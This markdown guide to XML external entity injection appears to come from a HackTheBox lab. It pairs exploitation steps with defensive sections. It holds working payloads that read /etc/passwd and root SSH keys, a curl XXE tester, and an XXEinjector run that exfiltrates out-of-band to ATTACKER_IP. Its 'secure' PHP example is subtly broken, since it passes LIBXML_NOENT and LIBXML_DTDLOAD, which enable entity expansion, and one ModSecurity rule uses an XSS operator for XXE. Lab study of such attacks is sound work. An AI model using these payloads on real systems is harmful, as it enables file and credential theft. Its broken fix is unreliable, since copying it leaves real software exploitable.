# 🛰️ XXE Injection Exploitation Guide

## Initial Setup & Reconnaissance

### Target Information Gathering
```bash
[!INFO] Gather target details, including IP and services running.

## Enumerate open ports and services using Nmap:
nmap -sC -sV 10.129.234.170
```

## Exploitation Steps

### Craft Custom XXE Payloads
```bash
[!INFO] Create a custom request file for the XXE attack.
cat > xxe.req << EOF
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.234.170
Content-Type: text/plain;charset=UTF-8
Content-Length: 169

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
EOF
```

### Execute XXEinjector
```bash
[!INFO] Use the XXEinjector tool to test for XXE vulnerabilities.

git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector

ruby XXEinjector.rb \
    --host=ATTACKER_IP \
    --httpport=8000 \
    --file=/tmp/xxe.req \
    --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php \
    --oob=http \
    --phpfilter

# Check results
cat Logs/10.129.234.170/327a6c4304ad5938eaf0efb6cc3e53dc.php.log
```

### Flag Retrieval
```bash
[!SUCCESS] After successful exploitation, retrieve the flag.
🎯 Flag: `HTB{...}`
---

## Automated XXE Testing

### XXE Detection Script
```bash
#!/bin/bash
# xxe-tester.sh

URL="$1"
if [ -z "$URL" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

echo "Testing XXE on: $URL"

# Test 1: Basic entity processing
echo "=== Test 1: Basic Entity Processing ==="
curl -s -X POST "$URL" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY test "XXE_TEST">]><root><email>&test;</email></root>' \
    | grep -i "XXE_TEST" && echo "✓ Basic XXE detected"

# Test 2: File disclosure
echo "=== Test 2: File Disclosure ==="
curl -s -X POST "$URL" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY file SYSTEM "file:///etc/passwd">]><root><email>&file;</email></root>' \
    | grep -i "root:" && echo "✓ File disclosure XXE detected"

# Test 3: HTTP SSRF
echo "=== Test 3: SSRF Detection ==="
curl -s -X POST "$URL" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY ssrf SYSTEM "http://httpbin.org/ip">]><root><email>&ssrf;</email></root>' \
    | grep -i "origin" && echo "✓ SSRF XXE detected"
```

### Burp Suite XXE Testing

#### Intruder Payloads
```xml
[!EXAMPLE] File enumeration payloads:
<!ENTITY file SYSTEM "file:///etc/passwd">
<!ENTITY file SYSTEM "file:///etc/hosts">
<!ENTITY file SYSTEM "file:///var/www/html/config.php">
<!ENTITY file SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

#### Content-Type Bypass
```http
[!INFO] Try different content types:
Content-Type: application/xml
Content-Type: text/xml  
Content-Type: application/soap+xml
Content-Type: application/xhtml+xml
---

## Vulnerable Code Examples

### PHP - Insecure XML Processing
```php
<?php
// Vulnerable: Default XML parser settings
$xml_data = file_get_contents('php://input');

// Dangerous: External entities enabled by default
$doc = new DOMDocument();
$doc->loadXML($xml_data); // XXE vulnerability

// Process XML without validation
$email = $doc->getElementsByTagName('email')->item(0)->nodeValue;
echo "Check your email: " . $email;
?>
```

### Secure XML Processing
```php
<?php
// Secure: Disable external entities
$xml_data = file_get_contents('php://input');

// Safe XML parser configuration
$doc = new DOMDocument();

// Disable external entity loading
libxml_disable_entity_loader(true);

// Additional security measures
$doc->resolveExternals = false;
$doc->substituteEntities = false;

// Safe XML loading
if ($doc->loadXML($xml_data, LIBXML_NOENT | LIBXML_DTDLOAD)) {
    $email = $doc->getElementsByTagName('email')->item(0)->nodeValue;
    
    // Validate and sanitize output
    $email = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
    echo "Check your email: " . $email;
} else {
    echo "Invalid XML format";
}
?>
---

## Prevention & Hardening

### XML Parser Configuration

#### PHP Security Settings
```php
<?php
// Disable external entity loading globally
libxml_disable_entity_loader(true);

// Safe DOMDocument usage
$doc = new DOMDocument();
$doc->resolveExternals = false;
$doc->substituteEntities = false;
?>
```

#### Java Security Settings
```xml
<!-- Disable DTD processing -->
<property name="http://apache.org/xml/features/disallow-doctype-decl" value="true"/>

<!-- Disable external general entities -->
<property name="http://xml.org/sax/features/external-general-entities" value="false"/>

<!-- Disable external parameter entities -->
<property name="http://xml.org/sax/features/external-parameter-entities" value="false"/>
```

### Application-Level Controls

#### Input Validation
```php
<?php
// Validate XML input before processing
function validateXML($xml_string) {
    // Check for dangerous patterns
    $dangerous_patterns = [
        '/<!ENTITY/i',
        '/SYSTEM/i', 
        '/PUBLIC/i',
        '/file:\/\//i',
        '/http:\/\//i',
        '/ftp:\/\//i'
    ];
    
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match($pattern, $xml_string)) {
            throw new Exception("Dangerous XML pattern detected");
        }
    }
    
    return true;
}
?>
```

#### Content-Type Validation
```php
<?php
// Only accept expected content types
$allowed_types = ['application/xml', 'text/xml'];
$content_type = $_SERVER['CONTENT_TYPE'] ?? '';

if (!in_array($content_type, $allowed_types)) {
    http_response_code(400);
    die("Invalid content type");
}
?>
---

## Detection & Monitoring

### Log Analysis
```bash
# Monitor for XXE attack patterns
grep -i "<!ENTITY" /var/log/apache2/access.log
grep -i "SYSTEM" /var/log/apache2/access.log
grep -i "file:///" /var/log/apache2/access.log

# Look for suspicious file access patterns
grep -E "(passwd|shadow|id_rsa)" /var/log/apache2/access.log
```

### Web Application Firewall Rules
```apache
# ModSecurity rules for XXE protection
SecRule REQUEST_BODY "@detectXSS" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'XXE Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"

# Block XML with external entities
SecRule REQUEST_BODY "@rx (?i)<!ENTITY.*SYSTEM" \
    "id:1002,\
    phase:2,\
    deny,\
    msg:'XML External Entity Attack'"
```

### Security Testing Checklist
- [ ] Test all XML input endpoints for entity processing
- [ ] Verify external entity loading is disabled
- [ ] Check for file disclosure vulnerabilities
- [ ] Test SSRF capabilities through XXE
- [ ] Validate parser error handling
- [ ] Monitor for DoS entity bomb attacks

---